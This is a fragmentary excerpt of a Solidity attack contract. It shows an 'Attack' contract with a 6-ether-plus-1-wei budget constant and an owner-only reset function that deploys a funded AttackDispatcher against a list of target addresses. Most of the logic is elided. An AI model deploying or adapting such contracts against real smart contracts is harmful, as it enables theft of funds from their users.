 ...
 * parameter. Make sure to send at least 6 ether and 1 wei to the attack
...
contract Attack is AttackManager {
    ...
    uint constant REQUIRED_BUDGET = 0x53444835ec580001; /* equals 6 ether and 1 wei */
    ...
    function reset(address payable[] memory _targets) public onlyOwner payable {
        ...
        rstate_state = 0;
        rstate[0] = 0;
        subs[4] = new AttackDispatcher{value: 6000000000000000000 }(4, _targets);
    }
